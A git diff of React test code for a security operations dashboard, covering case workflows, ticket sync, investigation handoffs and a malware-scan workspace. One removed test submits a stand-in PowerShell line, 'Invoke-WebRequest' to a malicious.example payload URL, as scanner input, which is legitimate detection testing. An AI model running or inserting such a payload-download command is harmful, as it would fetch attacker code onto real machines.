-    await waitFor(() => {
-      expect(countCalls('/api/efficacy/summary')).toBe(initialEfficacyCalls + 1);
-      expect(countCalls('/api/timeline/host')).toBe(initialTimelineCalls + 1);
-    });
-
-    fireEvent.click(screen.getByRole('button', { name: 'Timeline' }));
-
-    const timelineHeading = await screen.findByText('Host Timeline');
-    const timelineCard = timelineHeading.closest('.card');
-    if (!timelineCard) throw new Error('timeline card not found');
-
-    expect(await screen.findByText('Suspicious PowerShell launched')).toBeInTheDocument();
-
-    fireEvent.click(within(timelineCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countCalls('/api/efficacy/summary')).toBe(initialEfficacyCalls + 2);
-      expect(countCalls('/api/timeline/host')).toBe(initialTimelineCalls + 2);
-    });
-  });
-
-  it('syncs a focused case to external ticketing from the cases workspace', async () => {
-    const ticketBodies = [];
-    const caseCommentBodies = [];
-    const cases = [
-      {
-        id: 42,
-        title: 'Identity escalation case',
-        description: 'Unusual Okta password spray followed by MFA challenge failures.',
-        status: 'investigating',
-        priority: 'high',
-        assignee: 'analyst-1',
-        created_at: '2024-01-01T00:00:00Z',
-        updated_at: '2024-01-01T00:15:00Z',
-        incident_ids: [7],
-        event_ids: [1001, 1002],
-        tags: ['identity', 'okta'],
-        comments: [
-          {
-            author: 'analyst-1',
-            timestamp: '2024-01-01T00:12:00Z',
-            text: 'Containment started with targeted password resets.',
+          generated_at: '2024-01-01T00:00:00Z',
+          queue: { pending: 2 },
+          cases: { total: 1 },
+          incidents: { total: 1 },
+          response: { ready_to_execute: 1 },
+          identity: {
+            providers_configured: 1,
+            ready_providers: 0,
+            providers_with_gaps: 1,
+            scim_status: 'warning',
+            mapped_groups: 1,
+            automation_targets_aligned: 0,
           },
-        ],
-        evidence: [
-          {
-            kind: 'event',
-            reference_id: 'evt-1001',
-            description: 'Auth event bundle',
-            added_at: '2024-01-01T00:10:00Z',
-          },
-        ],
-        mitre_techniques: ['T1110'],
-      },
-    ];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/cases/stats')) {
-        return jsonResponse({
-          total: 1,
-          by_status: { investigating: 1 },
-          by_priority: { high: 1 },
-        });
-      }
-      if (href.includes('/api/cases') && method === 'GET') {
-        return jsonResponse({ cases });
-      }
-      if (href.includes('/api/cases/42/comment') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        caseCommentBodies.push(body);
-        cases[0] = {
-          ...cases[0],
-          comments: [
-            ...cases[0].comments,
-            {
-              author: 'analyst',
-              timestamp: '2024-01-01T00:20:00Z',
-              text: body.comment,
-            },
-          ],
-        };
-        return jsonResponse({ status: 'ok' });
-      }
-      if (href.includes('/api/tickets/sync') && method === 'POST') {
-        ticketBodies.push(JSON.parse(options.body));
-        return jsonResponse({
-          status: 'synced',
-          sync: {
-            id: 'sync-1',
-            provider: 'servicenow',
-            object_kind: 'case',
-            object_id: '42',
-            queue_or_project: 'SECOPS',
-            summary: 'Escalate identity investigation to the service desk',
-          },
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc?case=42#cases');
-
-    expect(await screen.findByText('Focused Case Workspace')).toBeInTheDocument();
-    expect((await screen.findAllByText(/Unusual Okta password spray/)).length).toBeGreaterThan(0);
-    expect(await screen.findByText('Incident #7')).toBeInTheDocument();
-    expect((await screen.findAllByText('T1110')).length).toBeGreaterThan(0);
-    expect((await screen.findAllByText('Auth event bundle')).length).toBeGreaterThan(0);
-    expect(
-      (await screen.findAllByText(/Containment started with targeted password resets/i)).length,
-    ).toBeGreaterThan(0);
-    expect(await screen.findByText('Ticket Sync')).toBeInTheDocument();
-
-    fireEvent.change(screen.getByLabelText('Add case note'), {
-      target: { value: 'Validated that MFA prompts were blocked tenant-wide.' },
-    });
-    fireEvent.click(screen.getByRole('button', { name: 'Post Case Note' }));
-
-    await waitFor(() => {
-      expect(caseCommentBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            comment: 'Validated that MFA prompts were blocked tenant-wide.',
-          }),
-        ]),
-      );
-    });
-
-    expect(
-      (await screen.findAllByText(/Validated that MFA prompts were blocked tenant-wide/i)).length,
-    ).toBeGreaterThan(0);
-
-    fireEvent.change(screen.getByLabelText('Ticketing provider'), {
-      target: { value: 'servicenow' },
-    });
-    fireEvent.change(screen.getByLabelText('Project or queue'), {
-      target: { value: 'SECOPS' },
-    });
-    fireEvent.change(screen.getByLabelText('Sync summary'), {
-      target: { value: 'Escalate identity investigation to the service desk' },
-    });
-    fireEvent.click(screen.getByRole('button', { name: 'Sync Case' }));
-
-    await waitFor(() => {
-      expect(ticketBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            provider: 'servicenow',
-            object_kind: 'case',
-            object_id: '42',
-            queue_or_project: 'SECOPS',
-            summary: 'Escalate identity investigation to the service desk',
-          }),
-        ]),
-      );
-    });
-
-    expect(await screen.findByText('Last ticket sync')).toBeInTheDocument();
-  });
-
-  it('opens a URL-addressable incident drawer from the case workspace', async () => {
-    const cases = [
-      {
-        id: 42,
-        title: 'Identity escalation case',
-        description: 'Unusual Okta password spray followed by MFA challenge failures.',
-        status: 'investigating',
-        priority: 'high',
-        assignee: 'analyst-1',
-        incident_ids: [7],
-        event_ids: [1001, 1002],
-        tags: ['identity', 'okta'],
-        comments: [],
-        evidence: [],
-        mitre_techniques: ['T1110'],
-      },
-    ];
-    const incidents = [
-      {
-        id: 7,
-        title: 'Password spray incident',
-        severity: 'high',
-        status: 'open',
-        created: '2024-01-01T00:00:00Z',
-      },
-    ];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/cases/stats')) {
-        return jsonResponse({
-          total: 1,
-          by_status: { investigating: 1 },
-          by_priority: { high: 1 },
-        });
-      }
-      if (href.includes('/api/cases') && method === 'GET') {
-        return jsonResponse({ cases });
-      }
-      if (href.endsWith('/api/incidents') || href.includes('/api/incidents?')) {
-        return jsonResponse({ incidents });
-      }
-      if (href.includes('/api/incidents/7/storyline')) {
-        return jsonResponse({
-          events: [
-            {
-              timestamp: '2024-01-01T00:03:00Z',
-              description: 'MFA failures spiked across the target tenant.',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/incidents/7') && !href.includes('/storyline')) {
-        return jsonResponse({
-          id: 7,
-          title: 'Password spray incident',
-          severity: 'high',
-          status: 'open',
-          summary: 'Identity abuse escalated from password spray into MFA fatigue.',
-          created: '2024-01-01T00:00:00Z',
-          updated: '2024-01-01T00:05:00Z',
-          owner: 'analyst-1',
-          case_id: 42,
-          event_ids: ['evt-2001'],
-          alert_ids: ['alert-77'],
-          agent_ids: ['agent-9'],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(
-      <SOCWorkbench />,
-      '/soc?case=42&incident=7&drawer=incident-detail&incidentPanel=storyline#cases',
-    );
-
-    const drawer = await screen.findByRole('dialog', { name: /incident workspace/i });
-    expect(
-      (await within(drawer).findAllByText('MFA failures spiked across the target tenant.')).length,
-    ).toBeGreaterThan(0);
-
-    fireEvent.click(within(drawer).getByRole('button', { name: 'Actions' }));
-
-    expect(
-      await within(drawer).findByRole('button', { name: 'Open Linked Case' }),
-    ).toBeInTheDocument();
-    expect(
-      await within(drawer).findByRole('button', { name: 'Open Response Workspace' }),
-    ).toBeInTheDocument();
-  });
-
-  it('opens a URL-addressable case drawer and posts notes from the drawer evidence panel', async () => {
-    const caseCommentBodies = [];
-    const cases = [
-      {
-        id: 42,
-        title: 'Identity escalation case',
-        description: 'Unusual Okta password spray followed by MFA challenge failures.',
-        status: 'investigating',
-        priority: 'high',
-        assignee: 'analyst-1',
-        created_at: '2024-01-01T00:00:00Z',
-        updated_at: '2024-01-01T00:15:00Z',
-        incident_ids: [7],
-        event_ids: [1001, 1002],
-        tags: ['identity', 'okta'],
-        comments: [
-          {
-            author: 'analyst-1',
-            timestamp: '2024-01-01T00:12:00Z',
-            text: 'Containment started with targeted password resets.',
-          },
-        ],
-        evidence: [
-          {
-            kind: 'event',
-            reference_id: 'evt-1001',
-            description: 'Auth event bundle',
-            added_at: '2024-01-01T00:10:00Z',
-          },
-        ],
-        mitre_techniques: ['T1110'],
-      },
-    ];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/cases/stats')) {
-        return jsonResponse({
-          total: 1,
-          by_status: { investigating: 1 },
-          by_priority: { high: 1 },
-        });
-      }
-      if (href.includes('/api/cases') && method === 'GET') {
-        return jsonResponse({ cases });
-      }
-      if (href.includes('/api/cases/42/comment') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        caseCommentBodies.push(body);
-        cases[0] = {
-          ...cases[0],
-          comments: [
-            ...cases[0].comments,
-            {
-              author: 'analyst',
-              timestamp: '2024-01-01T00:20:00Z',
-              text: body.comment,
-            },
-          ],
-        };
-        return jsonResponse({ status: 'ok' });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(
-      <SOCWorkbench />,
-      '/soc?case=42&drawer=case-workspace&casePanel=evidence#cases',
-    );
-
-    const drawer = await screen.findByRole('dialog', { name: /case workspace/i });
-    expect(await within(drawer).findByText('Auth event bundle')).toBeInTheDocument();
-    expect(
-      await within(drawer).findByText(/Containment started with targeted password resets/i),
-    ).toBeInTheDocument();
-
-    fireEvent.change(within(drawer).getByLabelText('Add case note (drawer)'), {
-      target: { value: 'Escalated identity scope confirmed from the drawer workflow.' },
-    });
-    fireEvent.click(within(drawer).getByRole('button', { name: 'Post Case Note' }));
-
-    await waitFor(() => {
-      expect(caseCommentBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            comment: 'Escalated identity scope confirmed from the drawer workflow.',
-          }),
-        ]),
-      );
-    });
-
-    expect(
-      (
-        await within(drawer).findAllByText(
-          /Escalated identity scope confirmed from the drawer workflow./i,
-        )
-      ).length,
-    ).toBeGreaterThan(0);
-
-    fireEvent.click(within(drawer).getByRole('button', { name: 'Actions' }));
-    expect(
-      await within(drawer).findByRole('button', { name: 'Open Response Workspace' }),
-    ).toBeInTheDocument();
-  });
-
-  it('tracks investigation progress and handoff inside the SOC workbench', async () => {
-    const workflows = [
-      {
-        id: 'credential-storm',
-        name: 'Investigate Credential Storm',
-        description: 'Step through identity abuse triage.',
-        severity: 'high',
-        estimated_minutes: 30,
-        mitre_techniques: ['T1110'],
-        steps: [{ order: 1 }, { order: 2 }],
-      },
-    ];
-    const cases = [
-      {
-        id: 42,
-        title: 'Identity escalation case',
-        assignee: 'analyst-1',
-        comments: [],
-      },
-    ];
-    const activeInvestigations = [
-      {
-        id: 'inv-7',
-        workflow_id: 'credential-storm',
-        workflow_name: 'Investigate Credential Storm',
-        workflow_description: 'Step through identity abuse triage.',
-        workflow_severity: 'high',
-        analyst: 'analyst-1',
-        case_id: '42',
-        started_at: '2024-01-01T00:00:00Z',
-        updated_at: '2024-01-01T00:00:00Z',
-        status: 'in-progress',
-        completed_steps: [],
-        notes: {},
-        findings: [],
-        total_steps: 2,
-        completion_percent: 0,
-        completion_criteria: ['Reset targeted credentials', 'Block the source IP range'],
-        next_step: {
-          order: 1,
-          title: 'Validate account lockouts',
-          description: 'Review sign-in telemetry for the sprayed identities.',
-        },
-        steps: [
-          {
-            order: 1,
-            title: 'Validate account lockouts',
-            description: 'Review sign-in telemetry for the sprayed identities.',
-            recommended_actions: ['Review lockout cadence and impossible travel alerts'],
-            evidence_to_collect: ['Auth logs', 'VPN source IP list'],
-            auto_queries: [
+          rollouts: {
+            canary_rules: 1,
+            canary_hunts: 1,
+            promotion_ready_rules: 1,
+            active_hunts: 1,
+            rollout_targets: 1,
+            average_canary_percentage: 10,
+            historical_events: 2,
+            rollback_events: 1,
+            last_rollout_at: '2024-01-03T00:00:00Z',
+            recent_history: [
               {
-                name: 'Launch Hunt',
-                endpoint: '/api/events/search',
-                description: 'Pivot into the hunt workspace for auth events.',
+                id: 'rollout-1',
+                action: 'content-promote',
+                version: 'Suspicious PowerShell v2',
+                platform: 'content-rule',
+                agent_id: 'rule-1',
+                rollout_group: 'canary',
+                status: 'succeeded',
+                requested_by: 'analyst-1',
+                notes: 'Rule rule-1 moved from draft to canary.',
+                recorded_at: '2024-01-03T00:00:00Z',
               },
             ],
-            api_pivot: '/api/events/search',
           },
-          {
-            order: 2,
-            title: 'Confirm containment',
-            description: 'Verify resets and IP blocks were applied everywhere.',
-            recommended_actions: ['Check account reset timestamps'],
-            evidence_to_collect: ['Identity provider audit trail'],
-            auto_queries: [],
-            api_pivot: '/api/response/request',
+          content: {
+            packs: 1,
+            enabled_packs: 1,
+            hunt_library: 1,
+            scheduled_hunts: 1,
+            saved_searches: 3,
+            packs_with_workflows: 1,
+            latest_pack_update: '2024-01-01T00:00:00Z',
           },
-        ],
-        handoff: null,
-      },
-    ];
-    const progressBodies = [];
-    const handoffBodies = [];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/cases/stats')) {
-        return jsonResponse({ total: cases.length, by_status: {}, by_priority: {} });
-      }
-      if (href.includes('/api/cases')) {
-        return jsonResponse({ cases });
-      }
-      if (href.includes('/api/investigations/workflows')) {
-        return jsonResponse(workflows);
-      }
-      if (href.includes('/api/investigations/active')) {
-        return jsonResponse(activeInvestigations);
-      }
-      if (href.includes('/api/investigations/progress') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        progressBodies.push(body);
-        const snapshot = activeInvestigations[0];
-
-        if (typeof body.step === 'number') {
-          if (body.completed === true && !snapshot.completed_steps.includes(body.step)) {
-            snapshot.completed_steps = [...snapshot.completed_steps, body.step];
-          }
-          if (body.completed === false) {
-            snapshot.completed_steps = snapshot.completed_steps.filter(
-              (step) => step !== body.step,
-            );
-          }
-          if (typeof body.note === 'string') {
-            snapshot.notes = { ...snapshot.notes, [body.step]: body.note };
-          }
-        }
-
-        if (body.finding) {
-          snapshot.findings = [...snapshot.findings, body.finding];
-        }
-
-        snapshot.completion_percent = Math.round(
-          (snapshot.completed_steps.length / snapshot.total_steps) * 100,
-        );
-        snapshot.next_step =
-          snapshot.steps.find((step) => !snapshot.completed_steps.includes(step.order)) || null;
-        snapshot.updated_at = '2024-01-01T00:05:00Z';
-
-        return jsonResponse(snapshot);
-      }
-      if (href.includes('/api/investigations/handoff') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        handoffBodies.push(body);
-        const snapshot = activeInvestigations[0];
-        snapshot.status = 'handoff-ready';
-        snapshot.analyst = body.to_analyst;
-        snapshot.handoff = {
-          from_analyst: 'analyst-1',
-          to_analyst: body.to_analyst,
-          summary: body.summary,
-          next_actions: body.next_actions,
-          questions: body.questions,
-          updated_at: '2024-01-01T00:10:00Z',
-        };
-        snapshot.updated_at = '2024-01-01T00:10:00Z';
-        cases[0] = {
-          ...cases[0],
-          assignee: body.to_analyst,
-          comments: [
-            ...cases[0].comments,
+          automation: {
+            playbooks: 1,
+            workflow_templates: 1,
+            dynamic_templates: 1,
+            active_executions: 1,
+            pending_approvals: 1,
+            success_rate: 0.5,
+            avg_execution_ms: 450,
+            active_investigations: 1,
+            historical_runs: 3,
+            last_execution_at: '2024-01-01T00:45:00Z',
+            recent_history: [],
+          },
+          analytics: {
+            api_requests: 10,
+            api_error_rate: 0.05,
+            unique_endpoints: 3,
+            busiest_endpoint: 'POST /api/hunts',
+            worst_p95_ms: 145,
+            search_queries_total: 4,
+            hunt_runs_total: 2,
+            response_exec_total: 1,
+            last_hunt_latency_ms: 220,
+            last_response_latency_ms: 90,
+          },
+          urgent_items: [],
+          hot_agents: [],
+          recommendations: [
             {
-              author: 'analyst-1',
-              timestamp: '2024-01-01T00:10:00Z',
-              text: `Investigation handoff from analyst-1 to ${body.to_analyst}`,
+              category: 'identity',
+              priority: 'high',
+              title: 'Complete identity routing',
+              summary: 'Provider or SCIM validation still blocks clean group-based routing.',
+              action_hint: 'Review IdP and SCIM mappings before widening automated response coverage.',
             },
           ],
-        };
-        return jsonResponse(snapshot);
+        });
       }
 
-      return defaultFetchImplementation(url, options);
+      return defaultFetchImplementation(url);
     });
 
     renderWithProviders(<SOCWorkbench />, '/soc');
-    fireEvent.click(await screen.findByRole('button', { name: 'Investigations' }));
 
-    const countCalls = (matcher) =>
-      globalThis.fetch.mock.calls.filter(([url]) => matcher(String(url))).length;
-
-    expect(await screen.findByText('Active Investigations')).toBeInTheDocument();
-    expect((await screen.findAllByText('Investigate Credential Storm')).length).toBeGreaterThan(0);
-    expect(
-      (await screen.findAllByRole('button', { name: 'Open Primary Pivot' })).length,
-    ).toBeGreaterThan(0);
-
-    const initialWorkflowCalls = countCalls((href) =>
-      href.includes('/api/investigations/workflows'),
-    );
-    const initialActiveCalls = countCalls((href) => href.includes('/api/investigations/active'));
-    const initialCaseCalls = countCalls(
-      (href) => href.includes('/api/cases') && !href.includes('/api/cases/stats'),
-    );
-    const initialCaseStatsCalls = countCalls((href) => href.includes('/api/cases/stats'));
-
-    expect(initialWorkflowCalls).toBeGreaterThan(0);
-    expect(initialActiveCalls).toBeGreaterThan(0);
-
-    const noteFields = await screen.findAllByLabelText('Analyst note');
-    fireEvent.change(noteFields[0], { target: { value: 'VPN telemetry reviewed' } });
-    fireEvent.click(screen.getAllByRole('button', { name: 'Save Note' })[0]);
+    expect(await screen.findByText('Recommendation Queue')).toBeInTheDocument();
+    fireEvent.click(await screen.findByRole('button', { name: 'Open retained events' }));
 
     await waitFor(() => {
-      expect(progressBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({ step: 1, note: 'VPN telemetry reviewed' }),
-        ]),
+      const currentUrl = new URL(
+        screen.getByTestId('location-probe').textContent || '/',
+        'http://localhost',
       );
-      expect(countCalls((href) => href.includes('/api/investigations/workflows'))).toBe(
-        initialWorkflowCalls + 1,
-      );
-      expect(countCalls((href) => href.includes('/api/investigations/active'))).toBe(
-        initialActiveCalls + 1,
-      );
-    });
-
-    fireEvent.click(screen.getAllByRole('button', { name: 'Mark Complete' })[0]);
-
-    await waitFor(() => {
-      expect(progressBodies).toEqual(
-        expect.arrayContaining([expect.objectContaining({ step: 1, completed: true })]),
-      );
-    });
-    expect(await screen.findByRole('button', { name: 'Reopen' })).toBeInTheDocument();
-
-    fireEvent.change(screen.getByLabelText('Handoff target'), {
-      target: { value: 'analyst-2' },
-    });
-    fireEvent.change(screen.getByLabelText('Summary'), {
-      target: { value: 'Containment is stable, but identity scope still needs confirmation.' },
-    });
-    fireEvent.change(screen.getByLabelText('Next actions'), {
-      target: { value: 'Confirm all resets\nValidate VPN blocks' },
-    });
-    fireEvent.change(screen.getByLabelText('Open questions'), {
-      target: { value: 'Was MFA bypassed?' },
-    });
-    fireEvent.click(screen.getByRole('button', { name: 'Hand Off Investigation' }));
-
-    await waitFor(() => {
-      expect(handoffBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            to_analyst: 'analyst-2',
-            summary: 'Containment is stable, but identity scope still needs confirmation.',
-          }),
-        ]),
-      );
-      expect(countCalls((href) => href.includes('/api/investigations/workflows'))).toBe(
-        initialWorkflowCalls + 3,
-      );
-      expect(countCalls((href) => href.includes('/api/investigations/active'))).toBe(
-        initialActiveCalls + 3,
-      );
-      expect(
-        countCalls((href) => href.includes('/api/cases') && !href.includes('/api/cases/stats')),
-      ).toBe(initialCaseCalls + 1);
-      expect(countCalls((href) => href.includes('/api/cases/stats'))).toBe(
-        initialCaseStatsCalls + 1,
-      );
-    });
-
-    expect((await screen.findAllByText('Handoff Ready')).length).toBeGreaterThan(0);
-    expect(await screen.findByText(/currently assigned to analyst-2/i)).toBeInTheDocument();
-    expect(
-      await screen.findByText(/analyst-1 handed this workflow to analyst-2/i),
-    ).toBeInTheDocument();
-
-    fireEvent.click(screen.getByRole('button', { name: 'Open Response' }));
-
-    expect(await screen.findByText('Workflow handoff context')).toBeInTheDocument();
-    expect(await screen.findByText(/Identity escalation case/)).toBeInTheDocument();
-    expect(await screen.findByRole('button', { name: 'Open Investigation' })).toBeInTheDocument();
-  });
-
-  it('runs deep malware scan from the infrastructure integrity workspace', async () => {
-    const scanBodies = [];
-    const sample = 'powershell Invoke-WebRequest https://malicious.example/payload';
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/malware/stats')) {
-        return jsonResponse({
-          database: { total_hashes: 12, by_family: { LockBit: 2 }, by_severity: { critical: 2 } },
-          scanner: {
-            total_scans: 5,
-            malicious_count: 2,
-            suspicious_count: 1,
-            clean_count: 2,
-            avg_scan_time_us: 1200,
-          },
-          yara_rules: 4,
-        });
-      }
-      if (href.includes('/api/malware/recent')) {
-        return jsonResponse([
-          {
-            sha256: 'abc123',
-            name: 'LockBit Loader',
-            family: 'LockBit',
-            severity: 'critical',
-            detected_at: '2024-01-01T00:00:00Z',
-            source: 'built-in',
-          },
-        ]);
-      }
-      if (href.includes('/api/scan/buffer/v2') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        scanBodies.push(body);
-        return jsonResponse({
-          scan: {
-            verdict: 'malicious',
-            confidence: 0.91,
-            malware_family: 'Loader',
-            static_score: {
-              score: 84,
-              band: 'likely_malicious',
-              rationale: ['Behavior and script indicators raised confidence.'],
-            },
-            matches: [
-              {
-                layer: 'behavior',
-                rule_name: 'runtime_behavior',
-                severity: 'high',
-                detail: 'observed tactics: suspicious_process_tree, c2_beaconing',
-              },
-            ],
-          },
-          static_profile: {
-            file_type: 'powershell',
-            platform_hint: 'script',
-            probable_signed: false,
-            trusted_publisher_match: 'microsoft',
-            internal_tool_match: null,
-            suspicious_traits: ['script-like content benefits from command inspection'],
-            analyst_summary: ['Detected powershell content for the script execution surface.'],
-          },
-          behavior_profile: {
-            severity: 'high',
-            observed_tactics: ['suspicious_process_tree', 'c2_beaconing'],
-            allowlist_match: 'microsoft',
-            recommended_actions: [
-              'Review script body for network, credential, and persistence commands.',
-              'Pivot to NDR beaconing results for related destinations.',
-            ],
-          },
-          analyst_summary: [
-            'Verdict: malicious with 91% confidence.',
-            'Detected powershell content for the script execution surface.',
-          ],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<Infrastructure />, '/infrastructure?tab=integrity');
-
-    expect(await screen.findByText('Deep Malware Scan')).toBeInTheDocument();
-    expect(await screen.findByText('Recent Malware Triage')).toBeInTheDocument();
-    expect((await screen.findAllByText('LockBit Loader')).length).toBeGreaterThan(0);
-
-    fireEvent.change(screen.getByLabelText('Sample filename'), {
-      target: { value: 'invoice_update.ps1' },
-    });
-    fireEvent.change(screen.getByLabelText('Sample content or script body'), {
-      target: { value: sample },
-    });
-    fireEvent.click(screen.getByLabelText('Suspicious process tree'));
-    fireEvent.click(screen.getByLabelText('C2 beaconing'));
-    fireEvent.change(screen.getByLabelText('Trusted publishers'), {
-      target: { value: 'microsoft' },
-    });
-    fireEvent.change(screen.getByLabelText('Internal tools'), {
-      target: { value: 'corp-updater' },
-    });
-    fireEvent.click(screen.getByRole('button', { name: 'Run Deep Scan' }));
-
-    await waitFor(() => {
-      expect(scanBodies).toEqual([
-        {
-          data: globalThis.Buffer.from(sample).toString('base64'),
-          filename: 'invoice_update.ps1',
-          behavior: {
-            suspicious_process_tree: true,
-            defense_evasion: false,
-            persistence_installed: false,
-            c2_beaconing_detected: true,
-            credential_access: false,
-          },
-          allowlist: {
-            trusted_publishers: ['microsoft'],
-            internal_tools: ['corp-updater'],
-          },
-        },
-      ]);
-    });
-
-    expect((await screen.findAllByText(/malicious/i)).length).toBeGreaterThan(0);
-    expect((await screen.findAllByText(/powershell/i)).length).toBeGreaterThan(0);
-    expect(await screen.findByText('Malware Verdict Workspace')).toBeInTheDocument();
-    expect(await screen.findByRole('button', { name: 'Verdict Summary' })).toBeInTheDocument();
-    expect(
-      await screen.findByText(/Trusted publisher allowlist matched "microsoft"/i),
-    ).toBeInTheDocument();
-    expect((await screen.findAllByText(/Pivot to NDR beaconing results/i)).length).toBeGreaterThan(
-      0,
-    );
-    fireEvent.click(screen.getByRole('button', { name: 'What To Do Next' }));
-    expect(await screen.findByText('Package Evidence')).toBeInTheDocument();
-    expect(await screen.findByText('Ask Assistant')).toBeInTheDocument();
-    fireEvent.click(screen.getByRole('button', { name: 'Static & Behavior Profiles' }));
-    expect(await screen.findByText('Malware static and behavior profiles')).toBeInTheDocument();
-  });
-
-  it('refreshes grouped infrastructure asset data from the assets workspace', async () => {
-    const callCounts = {
-      assetSummary: 0,
-      vulnerabilitySummary: 0,
-      certsSummary: 0,
-      certsAlerts: 0,
-      containerStats: 0,
-      malwareStats: 0,
-      malwareRecent: 0,
-      driftStatus: 0,
-    };
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-
-      if (href.includes('/api/assets/summary')) {
-        callCounts.assetSummary += 1;
-        return jsonResponse({
-          assets: [
-            {
-              id: 'host-1',
-              name: 'Critical asset host',
-              platform: 'Linux',
-              kind: 'asset',
-              status: 'degraded',
-              severity: 'high',
-              priority: 'critical',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/vulnerability/summary')) {
-        callCounts.vulnerabilitySummary += 1;
-        return jsonResponse({
-          findings: [
-            {
-              id: 'cve-1',
-              asset_name: 'Critical asset host',
-              cve: 'CVE-2026-0001',
-              severity: 'critical',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/certs/summary')) {
-        callCounts.certsSummary += 1;
-        return jsonResponse({ certificates: [] });
-      }
-      if (href.includes('/api/certs/alerts')) {
-        callCounts.certsAlerts += 1;
-        return jsonResponse({
-          alerts: [
-            {
-              id: 'cert-1',
-              common_name: 'api.wardex.local',
-              days_remaining: 6,
-              status: 'expiring',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/container/stats')) {
-        callCounts.containerStats += 1;
-        return jsonResponse({
-          containers: [
-            {
-              id: 'container-1',
-              name: 'payments-api',
-              runtime: 'containerd',
-              severity: 'high',
-              status: 'running',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/malware/stats')) {
-        callCounts.malwareStats += 1;
-        return jsonResponse({
-          database: { total_hashes: 12 },
-          scanner: { total_scans: 5, malicious_count: 1 },
-          yara_rules: 4,
-        });
-      }
-      if (href.includes('/api/malware/recent')) {
-        callCounts.malwareRecent += 1;
-        return jsonResponse([
-          {
-            sha256: 'abc123',
-            name: 'LoaderX',
-            family: 'Loader',
-            severity: 'critical',
-            detected_at: '2026-04-24T08:00:00Z',
-          },
-        ]);
-      }
-      if (href.includes('/api/drift/status')) {
-        callCounts.driftStatus += 1;
-        return jsonResponse({
-          changes: [{ id: 'drift-1', path: '/etc/ssh/sshd_config', type: 'removed' }],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<Infrastructure />, '/infrastructure?tab=assets');
-
-    expect((await screen.findAllByText('Critical asset host')).length).toBeGreaterThan(0);
-
-    const refreshButton = await screen.findByRole('button', { name: 'Refresh' });
-
-    await waitFor(() => {
-      expect(callCounts.assetSummary).toBeGreaterThan(0);
-      expect(callCounts.vulnerabilitySummary).toBeGreaterThan(0);
-      expect(callCounts.certsSummary).toBeGreaterThan(0);
-      expect(callCounts.certsAlerts).toBeGreaterThan(0);
-      expect(callCounts.containerStats).toBeGreaterThan(0);
-      expect(callCounts.malwareStats).toBeGreaterThan(0);
-      expect(callCounts.malwareRecent).toBeGreaterThan(0);
-      expect(callCounts.driftStatus).toBeGreaterThan(0);
-    });
-
-    const initialCounts = { ...callCounts };
-
-    fireEvent.click(refreshButton);
-
-    await waitFor(() => {
-      expect(callCounts.assetSummary).toBe(initialCounts.assetSummary + 1);
-      expect(callCounts.vulnerabilitySummary).toBe(initialCounts.vulnerabilitySummary + 1);
-      expect(callCounts.certsSummary).toBe(initialCounts.certsSummary + 1);
-      expect(callCounts.certsAlerts).toBe(initialCounts.certsAlerts + 1);
-      expect(callCounts.containerStats).toBe(initialCounts.containerStats + 1);
-      expect(callCounts.malwareStats).toBe(initialCounts.malwareStats + 1);
-      expect(callCounts.malwareRecent).toBe(initialCounts.malwareRecent + 1);
-      expect(callCounts.driftStatus).toBe(initialCounts.driftStatus + 1);
+      expect(currentUrl.pathname).toBe('/settings');
+      expect(currentUrl.searchParams.get('tab')).toBe('admin');
+      expect(currentUrl.searchParams.get('historical_device_id')).toBeNull();
+      expect(currentUrl.searchParams.get('historical_since')).toBe('2024-01-03T00:00:00Z');
+      expect(currentUrl.searchParams.get('historical_limit')).toBe('25');
     });
   });
 
@@ -1984,52 +388,4 @@ describe('workspace shells', () => {
     renderWithProviders(<ReportsExports />, '/reports');
     expect(await screen.findByText('Report Center')).toBeInTheDocument();
   });
-
-  it('renders contextual support shell', async () => {
-    renderWithProviders(<HelpDocs />, '/help');
-    expect(await screen.findByText('Operator Support')).toBeInTheDocument();
-  });
-});
-
-it('hydrates the SOC queue filter from URL state and clears back to the full queue', async () => {
-  globalThis.fetch.mockImplementation(async (url, options = {}) => {
-    const href = String(url);
-
-    if (href.includes('/api/queue/alerts')) {
-      return jsonResponse({
-        alerts: [
-          {
-            id: 'alert-1',
-            severity: 'high',
-            summary: 'Password spray against Okta tenant',
-            assigned_to: 'analyst-1',
-          },
-          {
-            id: 'alert-2',
-            severity: 'medium',
-            summary: 'Container drift detected on node-7',
-            assigned_to: 'analyst-2',
-          },
-        ],
-      });
-    }
-    if (href.includes('/api/queue/stats')) {
